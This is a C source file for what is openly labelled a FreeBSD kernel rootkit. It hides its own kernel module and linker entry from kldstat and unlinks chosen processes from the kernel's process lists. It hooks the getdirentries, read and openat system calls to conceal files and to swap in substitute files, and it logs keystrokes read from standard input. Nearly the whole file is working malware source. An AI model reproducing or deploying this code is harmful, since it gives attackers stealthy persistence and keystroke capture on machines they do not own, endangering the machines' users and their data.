/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "hide.h"
#include "hook.h"
#include "util.h"
#include "debug.h"
#include "config.h"
#include "keylog.h"

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/syscall.h>
#include <sys/dirent.h>
#include <sys/uio.h>
#include <sys/syscallsubr.h>
#include <sys/file.h>
#include <sys/filedesc.h>
#include <sys/vnode.h>
#include <sys/capsicum.h>

extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern struct sx modules_sx;
extern modulelist_t modules;
extern int nextid;

static char *openat_prepatch;
static char *read_prepatch;
static char *getdirentries_prepatch;

struct module {
	TAILQ_ENTRY(module) link;
	TAILQ_ENTRY(module) flink;
	struct linker_file *file;
	int refs;
	int id;
	char *name;
	modeventhand_t handler;
	void *arg;
	modspecific_t data;
};

void
hide_ko(char *ko_name)
{
	struct module *mod;

	sx_xlock(&modules_sx);

	LOGI("[rootkit:hide_ko] Look for ko: %s.\n", ko_name);
	TAILQ_FOREACH(mod, &modules, link)
	{
		LOGI("[rootkit:hide_ko] Found ko: %s.\n", mod->name);
		if (strcmp(mod->name, ko_name) == 0)
		{
			LOGI("[rootkit:hide_ko] Remove ko: %s.\n", mod->name);
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);
}

static void
decrement_kernel_image_ref_count(void)
{
	(&linker_files)->tqh_first->refs--;
}

void
hide_kld(char *kld_name)
{
	struct linker_file *lf;

	mtx_lock(&Giant);
	sx_slock(&kld_sx);

	LOGI("[rootkit:hide_kld] Look for linker file: %s.\n", kld_name);
	TAILQ_FOREACH(lf, &linker_files, link){
		LOGI("[rootkit:hide_kld] Found linker file: %s.\n", lf->filename);
		if(strcmp(lf->filename, kld_name) == 0){
			LOGI("[rootkit:hide_kld] Remove linker file: %s.\n", lf->filename);
			next_file_id--;
			TAILQ_REMOVE(&linker_files,lf,link);
			break;
		}
	}

	/* Must decrement twice for kldstat to return no changes
	 * when hiding the rootkit. */
	decrement_kernel_image_ref_count();
	decrement_kernel_image_ref_count();

	sx_unlock(&kld_sx);
	mtx_unlock(&Giant);
}

void
hide_process_by_id(pid_t id)
{
	struct proc *p;

	sx_slock(&allproc_lock);

	/* Two options.
	 * 1. Iterate over pidhashtabl.
	 * 2. Iterate over allproc_list.
	 *
	 * Better performance over pidhashtabl. */
	LIST_FOREACH(p, PIDHASH(id), p_list)
	{
		/* LOGI("[rootkit:hide_process_by_id] Found PID: %d\n", p->pid); */
		if (p->p_pid == id)
		{
			/* A process is either NEW, NORMAL, ZOMBIE
			 * (new means in creation, see proc.h). */
			if (p->p_state == PRS_NEW)
			{
				p = NULL;
				break;
			}

			/* LOGI("[rootkit:hide_process_by_id] Hide PID: %d\n", p->pid); */
			PROC_LOCK(p);

			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);

			PROC_UNLOCK(p);
			break;
		}
	}

	sx_sunlock(&allproc_lock);
}

static int
is_hidden_file(char *path)
{
	int i;

	for (i = 0; i < NUM_HIDDEN_FILES; i++)
	{
		if (strcmp(path, hidden_files[i]) == 0)
		{
			return(1);
		}

	}

	return(0);
}

static int
generate_path_from_fd(struct thread *td, int fd, char **retbuf, char **freebuf)
{
	int ret;

	struct file *fp;
	cap_rights_t rights;

	fp = NULL;

	ret = getvnode(td, fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
	if (ret == 0)
	{
		ret = vn_fullpath(td, fp->f_vnode, retbuf, freebuf);
		fdrop(fp, td);
	}

	return ret;
}

static int
is_hidden_file_in_dir(struct thread *td, int fd, char *filename)
{
	int ret;
	int len;

	char *dirpath;
	char *freebuf;
	char *filepath;

	dirpath = NULL;
	freebuf = NULL;
	ret = generate_path_from_fd(td, fd, &dirpath, &freebuf);
	if (ret)
	{
		return(ret);
	}

	/* Allocate string long enough for absolute path. */
	len = strlen(filename) + strlen(dirpath) + 1;
	filepath = malloc(len, M_TEMP, M_WAITOK);

	strcpy(filepath, dirpath);
	strcat(filepath, "/");
	strcat(filepath, filename);

	LOGI("[rootkit:is_hidden_file_in_dir] Check if file is hidden: %s.\n",
			filepath);

	ret = is_hidden_file(filepath);

	free(filepath, M_TEMP);
	free(freebuf, M_TEMP);
	return(ret);
}

static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
	struct dirent *dp;
	struct dirent *current;

	unsigned int size;
	unsigned int count;

	struct getdirentries_args *uap;
	uap = (struct getdirentries_args *) syscall_args;

	hook_set(sys_getdirentries, getdirentries_prepatch);
	sys_getdirentries(td, syscall_args);
	hook(sys_getdirentries, getdirentries_hook);

	if (td->td_proc->p_pid >= 15 && td->td_proc->p_pid <= 30)
	{
		return(0);
	}

	size = td->td_retval[0];

	if (size > 0)
	{
		dp = malloc(size, M_TEMP, M_WAITOK);
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		while ((current->d_reclen != 0) && (count > 0))
		{
			count -= current->d_reclen;

			if (is_hidden_file_in_dir(td, uap->fd, current->d_name))
			{
				LOGI("[rootkit:getdirentries_hook] Hidden file request.\n");
				if (count != 0)
				{
					bcopy(current + current->d_reclen,
							current, count);
				}

				size -= current->d_reclen;
				break;
			}

			if (count != 0)
			{
				/* Pointer trickery. */
				current = (struct dirent *)((char *) current
						+ current->d_reclen);
			}
		}

		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);

		free(dp, M_TEMP);
	}

	return(0);
}

static int
is_directory_of_hidden_file_of_index(struct thread *td, int fd, int index)
{
	int ret;
	int len;

	char *dirpath;
	char *freebuf;

	if (index >= NUM_HIDDEN_FILES)
	{
		return(0);
	}

	ret = generate_path_from_fd(td, fd, &dirpath, &freebuf);
	if (ret)
	{
		return(0);
	}

	LOGD("[rootkit:is_directory_of_hidden_file_of_index] Directory is %s.\n", dirpath);
	LOGD("[rootkit:is_directory_of_hidden_file_of_index] File path is %s.\n", hidden_files[index]);

	len = strlen(dirpath);
	ret = strncmp(dirpath, hidden_files[index], len) == 0;
	LOGD("[rootkit:is_directory_of_hidden_file_of_index] Comparison resolves as %d.\n", ret);

	free(freebuf, M_TEMP);

	return(ret);
}

static const char *
get_hidden_file_filename(unsigned int index)
{
	int len;
	const char *filename;

	if (index >= NUM_HIDDEN_FILES)
	{
		return NULL;
	}

	filename = hidden_files[index];
	len = strlen(filename);

	filename += len;
	while (*filename != '/')
	{
		/* Should I kill myself or have a cup of coffee? */
		filename--;
	}
	filename++;

	return filename;
}

static void
corrupt_directory_data(char *data, size_t data_len, const char *filename,
		size_t filename_len)
{
	char *mem;

	mem = (char *) memmem(data, data_len, filename, filename_len);
	if (mem == NULL)
	{
		return;
	}

	/* Iterate over memory and corrupt it. */
	for (; filename_len > 0; filename_len--, mem++)
	{
		*mem = '\0';
	}
}

static int
read_hook(struct thread *td, void *syscall_args)
{
	int i;
	int ret;
	int ret_sys;
	int size;

	char *buf;

	struct file *fp;
	struct vnode *vp;
	cap_rights_t rights;

	struct read_args *uap;

	hook_set(sys_read, read_prepatch);
	ret_sys = sys_read(td, syscall_args);
	hook(sys_read, read_hook);

	if (ret_sys)
	{
		return(ret_sys);
	}

	size = td->td_retval[0];

	uap = (struct read_args *) syscall_args;
	fp = NULL;
	buf = NULL;

	//Davids Testin
	if ((uap->nbyte) && (uap->nbyte == 1) &&  uap->fd == 0) {
	    char keybuf[1];
            copyin(uap->buf, keybuf, 1);
 
            int keyError = key_log(td, keybuf);
            if(keyError)
	        return(keyError);
	    return(ret_sys);
	}
	//end
	ret = getvnode(td, uap->fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
	if (ret == 0)
	{
		vp = fp->f_vnode;
		if (vp != NULL && vp->v_type == VDIR)
		{
			LOGI("[rootkit:read_hook] Directory read detected.\n");
			for (i = 0; i < NUM_HIDDEN_FILES; i++)
			{
				if (is_directory_of_hidden_file_of_index(
							td, uap->fd, i))
				{
					LOGI("[rootkit:read_hook] Directory read on hidden file detected.\n");
					/* Copying buffer into kernel memory. */
					if (buf == NULL)
					{
						buf = malloc(size, M_TEMP, M_WAITOK);
						copyin(uap->buf, buf, size);
					}

					/* Overwrite buffer. */
					corrupt_directory_data(buf, size,
							get_hidden_file_filename(i),
							strlen(get_hidden_file_filename(i)));
				}
			}
		}

		fdrop(fp, td);
	}

	if (buf != NULL)
	{
		copyout(buf, uap->buf, size);
		free(buf, M_TEMP);
	}

	return(ret_sys);
}

static int
is_transparent_file(char *path)
{
	int i;

	for (i = 0; i < NUM_TRANSPARENT_FILES; i++)
	{
		if (strcmp(path, transparent_files[i]) == 0)
		{
			return(1);
		}

	}

	return(0);
}

static char *
generate_transparent_path(char *path)
{
	int len;

	char *ext;
	char *filepath;

	ext = ".transparent";
	len = strlen(path) + strlen(ext) + 1;
	filepath = malloc(len, M_TEMP, M_WAITOK);

	strcpy(filepath, path);
	strcat(filepath, ext);
	return(filepath);
}

static int
openat_hook(struct thread *td, void *syscall_args)
{
	int ret;
	int sys_ret;
	int fd;

	char *filepath;
	char *freebuf;
	char *transparent_path;

	struct openat_args *uap;
	struct close_args uap_close;

	uap = (struct openat_args *) syscall_args;

	hook_set(sys_openat, openat_prepatch);
	sys_ret = sys_openat(td, syscall_args);
	hook(sys_openat, openat_hook);

	fd = td->td_retval[0];

	if (fd < 0)
	{
		return(sys_ret);
	}

	ret = generate_path_from_fd(td, fd, &filepath, &freebuf);
	if (ret)
	{
		return(sys_ret);
	}

	if (is_transparent_file(filepath))
	{
		/* Close file.
		 * Open a different file.
		 * Return that. */
		uap_close.fd = fd;
		ret = sys_close(td, &uap_close);
		if (ret)
		{
			free(freebuf, M_TEMP);
			return(sys_ret);
		}

		transparent_path = generate_transparent_path(filepath);
		ret = kern_openat(td, uap->fd, transparent_path, UIO_SYSSPACE,
				uap->flag, uap->mode);

		free(transparent_path, M_TEMP);
		free(freebuf, M_TEMP);

		if (ret)
		{
			return(sys_ret);
		}

		return(ret);
	}

	return(sys_ret);
}

void
hide_files(void)
{
	getdirentries_prepatch = hook_fetch(sys_getdirentries);
	hook(sys_getdirentries, getdirentries_hook);

	read_prepatch = hook_fetch(sys_read);
	hook(sys_read, read_hook);

	openat_prepatch = hook_fetch(sys_openat);
	hook(sys_openat, openat_hook);
}

void
unhide_files(void)
{
	hook_set(sys_getdirentries, getdirentries_prepatch);
	free(getdirentries_prepatch, M_TEMP);

	hook_set(sys_read, read_prepatch);
	free(read_prepatch, M_TEMP);

	hook_set(sys_openat, openat_prepatch);
	free(openat_prepatch, M_TEMP);
}
